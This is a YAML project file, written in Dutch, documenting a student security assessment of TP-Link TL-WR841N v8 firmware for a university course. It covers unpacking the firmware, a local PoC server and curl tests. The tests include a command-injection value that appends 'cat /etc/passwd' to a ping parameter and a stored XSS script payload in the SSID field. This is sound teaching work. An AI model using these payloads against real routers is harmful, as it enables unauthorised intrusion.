project: "TP-Link TL-WR841N Firmware Security Assessment"

description: >
  Dit project documenteert een security assessment van de TP-Link TL-WR841N (v8) firmware.
  De analyse is uitgevoerd in het kader van de Novi University – Software Security leerlijn.

overview:
  details: >
    Tijdens dit onderzoek zijn firmwarebestanden gedownload, uitgepakt en geanalyseerd
    met zowel statische als dynamische methoden.
    Omdat de originele httpd binary beperkt draaide in emulatie, is een eigen
    Python Proof-of-Concept server (upload_server.py) opgezet om kwetsbaarheden te demonstreren.
  endpoints:
    - path: "/userRpm/LoginRpm.htm"
      description: "Authenticatie"
    - path: "/userRpm/SoftwareUpgradeRpm.htm"
      description: "Firmware upload"
    - path: "/userRpm/BakNRestoreRpm.htm"
      description: "Config backup/restore"
    - path: "/userRpm/DiagnosticRpm.htm"
      description: "Ping/Traceroute"
    - path: "/userRpm/WlanAdvRpm.htm"
      description: "SSID configuratie"

preparation:
  firmware_download_and_unpack: |
    cd ~/iot/tplink_tlwr841n
    wget https://static.tp-link.com/TL-WR841N(UN)_V8_170210.zip
    unzip TL-WR841N(UN)_V8_170210.zip
    cd TL-WR841N(UN)_V8_170210
    binwalk -e --run-as=root wr841nv8_en_3_16_9_up_boot\(170210\).bin
  check_rootfs: |
    tree -L 2 squashfs-root-fixed

poc_server:
  description: >
    De aangepaste PoC-server (upload_server.py) simuleert meerdere kwetsbare endpoints:
    - Config Restore Upload
    - Diagnostic Command Injection
    - WLAN SSID Stored XSS
  start: |
    python3 upload_server.py 8088
  expected_output: "[i] Listening on 0.0.0.0:8088"

tests:
  - name: "Config Restore (BakNRestoreRpm)"
    steps:
      - description: "Genereer een fake backup"
        command: "dd if=/dev/urandom of=backup.bin bs=1K count=1"
      - description: "Upload via PoC-server"
        command: |
          curl -i -X POST -F "config=@backup.bin" \
            http://127.0.0.1:8088/web/userRpm/BakNRestoreRpm.htm

  - name: "DiagnosticRpm (Command Injection)"
    vulnerable_parameter: "ping_addr"
    command: |
      curl -i -X POST -d "ping_addr=8.8.8.8; cat /etc/passwd" \
        http://127.0.0.1:8088/web/userRpm/DiagnosticRpm.htm

  - name: "WLAN SSID (Stored XSS)"
    steps:
      - description: "Injecteer payload"
        command: |
          curl -i -X POST -d "ssid=<script>alert('XSS')</script>" \
            http://127.0.0.1:8088/web/userRpm/WlanAdvRpm.htm
      - description: "Controleer in browser"
        note: "De SSID komt terug inclusief payload."

disclaimer: >
  Dit project is uitsluitend bedoeld voor educatieve doeleinden binnen de
  NOVI University Software Security leerlijn.
  Voer deze stappen nooit uit op productieapparatuur of netwerken zonder expliciete toestemming.

references:
    url: "https://static.tp-link.com/TL-WR841N(UN)_V8_170210.zip"
